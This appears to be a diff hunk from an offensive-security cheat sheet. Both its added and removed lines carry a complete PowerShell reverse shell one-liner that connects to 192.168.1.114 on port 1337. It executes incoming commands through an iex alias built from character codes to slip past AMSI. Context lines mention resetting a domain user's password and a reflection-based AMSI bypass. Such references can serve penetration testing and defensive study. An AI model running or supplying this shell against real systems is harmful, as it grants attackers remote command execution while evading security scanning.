@@ -24,7 +24,7 @@ Set-DomainUserPassword -Identity stgadm -AccountPassword $newpass
 ## Powershell Reverse Shell one Liner (AMSI Bypass)
 
 ```Powershell
-$ip='192.168.1.114';$port=1337;$client = New-Object System.Net.Sockets.TCPClient -ArgumentList $ip, $port;$s = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};$l = "lol";Set-alias $l ([char]105 + [char]101 + [char]120);while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (lol $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$client.Close()
+$ip='192.168.1.114';$port=1337;$client = New-Object System.Net.Sockets.TCPClient -ArgumentList $ip, $port;$s = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};$l = 'lol';Set-alias $l ([char]105 + [char]101 + [char]120);while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (lol $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$client.Close()
 ```
 
 ## AMSI Bypass (Modified Version) - Credit to Matt Graebers Reflection method 
